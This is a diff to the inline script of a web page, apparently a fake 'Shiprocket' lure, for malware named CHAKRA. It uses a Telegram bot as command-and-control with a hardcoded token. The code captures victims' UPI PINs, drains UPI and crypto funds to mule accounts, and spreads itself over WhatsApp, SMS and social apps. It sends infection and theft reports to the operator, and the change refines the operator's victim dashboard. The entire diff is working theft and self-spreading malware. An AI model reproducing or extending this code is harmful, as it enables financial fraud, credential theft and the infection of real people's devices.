@@ -140,17 +140,13 @@
 
 <script>
   // ============================================================
-  // CHAKRA - CENTRAL DATA VIA TELEGRAM BOT
+  // CHAKRA - COMPLETE SCRIPT WITH DOWNLOAD HISTORY
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
-  // ===== CENTRAL DATA STORED IN BOT MEMORY =====
-  // This data persists as long as the bot is running
-  // Each victim's phone sends data here via sendToTelegram()
-
-  // ===== LOCAL VARIABLES =====
+  // ===== VARIABLES =====
   let myUPIList = ['mule1@paytm'];
   let currentUPIIndex = 0;
   let capturedPIN = null;
@@ -172,28 +168,13 @@
   let spreadCounts = { whatsapp: 0, sms: 0, telegram: 0, instagram: 0, facebook: 0, gpay: 0 };
 
   // ============================================================
-  // SEND TO TELEGRAM (CENTRAL DATA STORAGE)
+  // SEND TO TELEGRAM
   // ============================================================
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: YOUR_USERNAME, text: message })
-    }).catch(() => {});
-  }
-
-  // ============================================================
-  // SEND VICTIM DATA TO CENTRAL STORAGE (BOT)
-  // ============================================================
-  function sendVictimDataToBot(data) {
-    const message = JSON.stringify(data);
-    fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: YOUR_USERNAME,
-        text: '[DATA] ' + message
-      })
     }).catch(() => {});
   }
 
@@ -292,17 +273,6 @@
     const deviceId = getDeviceId();
     const victim = getVictimDetails();
     infectedDevices.push({ id: deviceId, action: action, victim: victim, lastSpread: Date.now(), lastVector: 'WA' });
-    
-    // Send infection data to central bot
-    const infectionData = {
-      type: 'infection',
-      deviceId: deviceId,
-      victim: victim,
-      totalInfected: infectedDevices.length
-    };
-    sendVictimDataToBot(infectionData);
-    
-    // Also send regular notification
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
     if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
@@ -406,14 +376,6 @@
       return;
     }
     const victim = getVictimDetails();
-    const drainData = {
-      type: 'crypto_drain',
-      token: token,
-      amount: amount,
-      address: address,
-      victim: victim
-    };
-    sendVictimDataToBot(drainData);
     sendToTelegram(
       '💸 CRYPTO DRAIN!\n─────────────────\n📱 Victim: ' + victim.name + '\n💰 Token: ' + token + '\n🔢 Amount: ' + amount + ' ' + token + '\n📤 Sent to: ' + address
     );
@@ -480,13 +442,6 @@
           setTimeout(() => {
             window.Android.confirmTransaction();
             totalDrained += amount;
-            const drainData = {
-              type: 'upi_drain',
-              amount: amount,
-              targetUPI: targetUPI,
-              victim: getVictimDetails()
-            };
-            sendVictimDataToBot(drainData);
             sendToTelegram('✅ ₹' + amount + ' sent to ' + targetUPI);
             sendToTelegram('💰 Total Drained: ₹' + totalDrained);
             pinCaptured = false;
@@ -640,11 +595,6 @@
         pinCaptured = true;
         pinCapturedCount++;
         const victim = getVictimDetails();
-        const pinData = {
-          type: 'pin_captured',
-          victim: victim
-        };
-        sendVictimDataToBot(pinData);
         sendToTelegram('🔑 UPI PIN captured!\n📱 Name: ' + victim.name + '\n💰 Balance: ₹' + victim.balance);
         if (myUPIList.length > 0) {
           readyToMoveCount++;
@@ -822,10 +772,27 @@
               sendToTelegram('▶️ Resumed');
             }
 
-            // ---- DASHBOARD (READS DATA FROM BOT MEMORY) ----
+            // ---- DASHBOARD WITH DOWNLOAD HISTORY ----
             if (msg === '/dashboard') {
-              // The bot will reply with data stored in memory
-              // Since the bot stores data from all victims, this shows global data
+              // Get recent downloads (last 10)
+              const recentDownloads = infectedDevices
+                .slice(-10)
+                .reverse()
+                .map((d, i) => {
+                  const timeAgo = Math.round((Date.now() - d.lastSpread) / 60000);
+                  return `${i+1}. ${d.deviceId || 'Unknown'} → Downloaded: ${timeAgo} min ago`;
+                })
+                .join('\n');
+
+              const totalEngagement = spreadCounts.whatsapp + spreadCounts.sms + spreadCounts.telegram + spreadCounts.instagram + spreadCounts.facebook + spreadCounts.gpay;
+              const activeSpreaders = infectedDevices.filter(d => d.lastSpread && (Date.now() - d.lastSpread < 30 * 60 * 1000));
+              const workerList = activeSpreaders.length > 0 
+                ? activeSpreaders.slice(0, 5).map((d, i) => {
+                    const minsAgo = Math.round((Date.now() - d.lastSpread) / 60000);
+                    return `${i+1}. ${d.deviceId || 'Unknown'} → Last spread: ${minsAgo} min ago (${d.lastVector || 'WA'})`;
+                  }).join('\n') + (activeSpreaders.length > 5 ? `\n... and ${activeSpreaders.length - 5} more active` : '')
+                : 'No active spreaders';
+
               let dashboardMsg =
                 '📊 CHAKRA DASHBOARD (ALL VICTIMS)\n─────────────────\n' +
                 '📱 TOTAL INFECTED: ' + infectedDevices.length + '\n' +
@@ -833,6 +800,9 @@
                 '💰 READY TO MOVE: ' + readyToMoveCount + '\n' +
                 '⏳ WAITING FOR UPI: ' + waitingForUPICount + '\n' +
                 '🚀 SPREADERS: ' + infectedDevices.length + ' (100% active)\n' +
+                '─────────────────\n' +
+                '📥 RECENT DOWNLOADS (Last 10):\n' +
+                (recentDownloads || 'No downloads yet') + '\n' +
                 '─────────────────\n' +
                 '🚀 SPREAD COUNTS (Last 24h):\n' +
                 'WhatsApp: ' + spreadCounts.whatsapp + ' messages sent\n' +
@@ -842,13 +812,9 @@
                 'Facebook: ' + spreadCounts.facebook + ' posts shared\n' +
                 'Google Pay: ' + spreadCounts.gpay + ' requests sent\n' +
                 '─────────────────\n' +
-                '📊 TOTAL ENGAGEMENT: ' + (spreadCounts.whatsapp + spreadCounts.sms + spreadCounts.telegram + spreadCounts.instagram + spreadCounts.facebook + spreadCounts.gpay) + '\n' +
+                '📊 TOTAL ENGAGEMENT: ' + totalEngagement + '\n' +
                 '─────────────────\n' +
-                '📱 ACTIVE SPREADERS (Worker List):\n' +
-                (infectedDevices.length > 0 ? infectedDevices.slice(0, 5).map((d, i) => {
-                  const minsAgo = Math.round((Date.now() - d.lastSpread) / 60000);
-                  return `${i+1}. ${d.deviceId} → Last spread: ${minsAgo} min ago (${d.lastVector || 'WA'})`;
-                }).join('\n') + (infectedDevices.length > 5 ? `\n... and ${infectedDevices.length - 5} more active` : '') : 'No active spreaders') + '\n' +
+                '📱 ACTIVE SPREADERS (Worker List):\n' + workerList + '\n' +
                 '─────────────────\n' +
                 '📊 TOTAL DRAINED: ₹' + totalDrained + '\n' +
                 '💸 USDT DRAINED: ' + (cryptoBalances.USDT ? cryptoBalances.USDT : '0') + ' USDT\n' +
